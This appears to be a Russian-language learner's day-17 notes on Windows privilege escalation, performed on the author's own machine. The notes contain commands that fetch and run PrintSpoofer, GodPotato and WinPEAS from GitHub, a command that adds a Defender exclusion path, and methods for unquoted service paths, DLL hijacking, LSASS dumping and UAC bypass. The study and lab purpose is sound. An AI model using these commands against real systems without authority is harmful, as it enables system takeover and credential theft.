# День 17 — Windows Privilege Escalation (PrivEsc)
**Дата:** 2026-05-04
**Платформа:** Windows 11 (реальная машина Мухаммада)

---

## Первые команды после получения шелла на Windows

```cmd
whoami                    → текущий пользователь
whoami /priv              → привилегии токена
whoami /groups            → группы пользователя
net users                 → все пользователи системы
net localgroup Administrators  → кто в группе админов
systeminfo                → версия ОС, патчи
netstat -ano              → открытые порты и соединения
```

### Результат на нашей системе:
```
Пользователь: muhammad\мухаммад
Группы: BUILTIN\Администраторы, Hyper-V Administrators
UAC: включён (0x5 = стандартный уровень)
```

---

## Самые ценные привилегии для PrivEsc

| Привилегия | Что даёт | Метод |
|-----------|---------|-------|
| **SeImpersonatePrivilege** | 🔴 SYSTEM | Potato атаки |
| **SeAssignPrimaryToken** | 🔴 SYSTEM | Potato атаки |
| **SeDebugPrivilege** | 🔴 дамп LSASS → пароли | procdump / mimikatz |
| **SeBackupPrivilege** | читаем любые файлы | SAM, SYSTEM дамп |
| **SeRestorePrivilege** | пишем в любые файлы | замена системных файлов |
| **SeTakeOwnership** | владеем любым файлом | захват системных ресурсов |
| **SeLoadDriver** | загружаем драйвер | уязвимый kernel driver |

---

## 🔴 КРИТИЧЕСКАЯ НАХОДКА — SeImpersonatePrivilege ВКЛЮЧЁН!

```
SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED  ← ОПАСНО!
SeDebugPrivilege:       SE_PRIVILEGE_ENABLED  ← тоже включён!
```

### Что такое SeImpersonatePrivilege:
Позволяет процессу "притворяться" другим пользователем.
Если включён у непривилегированного пользователя → Potato атака!

### Potato атаки — одна команда до SYSTEM:

```powershell
# Скачиваем PrintSpoofer
curl -L https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe -o C:\Windows\Temp\spoof.exe

# Запускаем cmd от SYSTEM
C:\Windows\Temp\spoof.exe -i -c cmd

# Результат:
whoami → nt authority\system ← SYSTEM!
```

```powershell
# Или GodPotato (более универсальный)
curl -L https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe -o C:\Windows\Temp\god.exe

# Запускаем команду от SYSTEM
C:\Windows\Temp\god.exe -cmd "whoami"
# → nt authority\system
```

---

## Реестр — поиск уязвимостей

```powershell
# UAC настройки
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
# 0x1 = UAC включён

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# 0x5 = стандартный уровень

# AlwaysInstallElevated (если 0x1 в обоих — можно MSI PrivEsc)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Ошибка = не настроен (хорошо)

# AutoLogon пароль
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# DefaultPassword = пусто (хорошо, пароль не сохранён)
# AutoLogonSID = есть, LastUsedUsername = Мухаммад
```

---

## Unquoted Service Path

```powershell
# Поиск сервисов без кавычек в пути
Get-WmiObject Win32_Service | Where-Object {
  $_.PathName -notmatch '^"' -and
  $_.PathName -notmatch '^C:\\Windows'
} | Select-Object Name, PathName
```

### Найдено на нашей системе:
```
vmware-tray.exe     ← Unquoted + Space detected
IntelGraphicsSoftware ← Unquoted + Space detected
```

### Как эксплуатировать Unquoted Path:
```
Если путь: C:\Program Files\My App\service.exe
Windows ищет по очереди:
  C:\Program.exe           ← если создадим здесь → выполнится!
  C:\Program Files\My.exe  ← или здесь
  C:\Program Files\My App\service.exe
```

---

## WinPEAS — результаты

```powershell
# Скачать и запустить
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
$url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"
Invoke-WebRequest -Uri $url -OutFile "C:\Windows\Temp\winpeas.exe"
C:\Windows\Temp\winpeas.exe | Tee-Object -FilePath "C:\Windows\Temp\winpeas_output.txt"
```

### Главные находки WinPEAS на нашей системе:

```
🔴 SeImpersonatePrivilege ENABLED  → PrintSpoofer/GodPotato → SYSTEM!
🔴 SeDebugPrivilege ENABLED        → дамп LSASS → пароли в памяти
🟡 Сотни сервисов с AllAccess      → можем изменять конфиги сервисов
🟡 DLL Hijacking в PATH            → C:\Windows\system32 writable
🟡 Unquoted Path                   → vmware-tray, IntelGraphicsSoftware
🟡 Named Pipes с низкими правами   → eventlog, ROUTER
✅ AlwaysInstallElevated = нет      → MSI PrivEsc не работает
✅ AutoLogon пароль = нет           → пароль не хранится в реестре
```

---

## DLL Hijacking

```
Если программа загружает DLL без полного пути:
LoadLibrary("malicious.dll")

Windows ищет по порядку:
1. Директория программы
2. C:\Windows\System32  ← writable для Administrators!
3. C:\Windows\System32\Wbem
4. PATH переменные

→ Подкладываем свою DLL в writable папку!
```

---

## Итоговая таблица Windows PrivEsc векторов

| Вектор | Статус | Метод |
|--------|--------|-------|
| **SeImpersonatePrivilege** | ✅ ВКЛЮЧЁН | PrintSpoofer → SYSTEM |
| **SeDebugPrivilege** | ✅ ВКЛЮЧЁН | дамп LSASS → пароли |
| UAC bypass | 🟡 Возможен | fodhelper, eventvwr |
| AlwaysInstallElevated | ❌ Нет | — |
| AutoLogon пароль | ❌ Нет | — |
| Unquoted Service Path | 🟡 Есть | VMware, Intel |
| DLL Hijacking PATH | 🟡 Возможен | System32 writable |
| Modifiable Services | 🟡 Сотни | перезапись конфига |

---

## Порядок Windows PrivEsc в реальных пентестах

```
1. whoami /priv        → SeImpersonate? → Potato → SYSTEM!
2. WinPEAS             → автоматически находит всё
3. AlwaysInstallElevated → MSI с SYSTEM
4. Unquoted Service Path → подменяем бинарник
5. DLL Hijacking       → подменяем DLL
6. Modifiable Services → меняем binPath сервиса
7. UAC Bypass          → если нужно обойти UAC
```

---

## Инструменты дня

| Инструмент | Команда | Что делает |
|-----------|---------|------------|
| whoami /priv | `whoami /priv` | показывает привилегии токена |
| WinPEAS | `winpeas.exe` | автоматизирует всю разведку |
| PrintSpoofer | `PrintSpoofer64.exe -i -c cmd` | SeImpersonate → SYSTEM |
| GodPotato | `GodPotato-NET4.exe -cmd "cmd"` | SeImpersonate → SYSTEM |
| reg query | `reg query HKLM\... /v AlwaysInstallElevated` | проверка реестра |
| Get-WmiObject | `Get-WmiObject Win32_Service` | поиск Unquoted Path |
